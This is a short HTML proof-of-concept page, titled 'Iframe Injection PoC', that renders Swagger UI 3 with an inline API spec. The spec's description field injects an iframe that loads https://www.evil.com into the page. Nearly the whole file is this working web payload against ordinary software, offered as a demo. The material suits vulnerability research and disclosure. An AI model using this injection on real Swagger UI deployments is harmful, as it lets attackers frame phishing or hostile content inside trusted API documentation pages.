<!DOCTYPE html>
<html>
<head>
    <title>Iframe Injection Demo</title>
    <link rel="stylesheet" type="text/css" href="https://unpkg.com/swagger-ui-dist@3/swagger-ui.css">
</head>
<body>
    <div id="swagger-ui"></div>
    
    <script src="https://unpkg.com/swagger-ui-dist@3/swagger-ui-bundle.js"></script>
    <script>
        const spec = {
            swagger: '2.0',
            info: {
                version: '1.0.0',
                title: 'Iframe Injection PoC',
                description: "<iframe src='https://www.evil.com' width='100%' height='600'>"
            },
            host: 'localhost',
            basePath: '/',
            paths: {
                '/test': {
                    get: {
                        responses: {
                            200: { description: 'OK' }
                        }
                    }
                }
            }
        };
        
        SwaggerUIBundle({
            spec: spec,
            dom_id: '#swagger-ui'
        });
    </script>
</body>
</html>
